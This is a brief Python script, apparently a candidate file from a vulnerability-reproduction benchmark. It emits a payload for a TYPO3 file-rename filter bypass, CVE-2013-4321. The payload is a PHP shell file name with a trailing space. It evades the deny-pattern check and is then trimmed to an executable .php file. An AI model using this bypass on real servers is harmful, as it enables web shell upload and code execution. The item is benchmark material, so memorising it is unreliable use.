#!/usr/bin/env python3
# [RESIDUAL] CVE-2013-4321 trailing-space bypass（heldout 语义内嵌，不引用 hidden 文件）。
#
# V1 (TYPO3 6.0.8) 的 CVE-2013-4250 修复对 RAW rename 目标做 fileDenyPattern 检查：
# "seed_shell.php "（尾随一个空格）既非控制字符、也不被锚定正则 `\.(php[3-6]?|phpsh|phtml)(\..*)?$`
# 匹配（$ 在空格之后），于是通过 RAW 检查；随后 LocalDriver::sanitizeFileName 的 trim() 去掉空格，
# 文件以 ".php" 落地并被 Apache 执行 -> canary 泄出。
# V2 (TYPO3 6.0.9, CVE-2013-4321 修复) 在检查前先 sanitize(trim) -> 归一化为 ".php" -> 被阻断。
#
# candidate schema: {"mode","target"} consumed by seed_exec.run_probe。


def candidate():
    return {
        "mode": "trailing_space_bypass",   # CVE-2013-4321 residual
        "target": "residual_shell.php ",   # NOTE trailing space: stripped by sanitizeFileName's trim()
    }


if __name__ == "__main__":
    import json
    import sys
    _ = sys.argv  # 占位，保持与 original_poc.py 相同的调用签名
    print(json.dumps(candidate()))
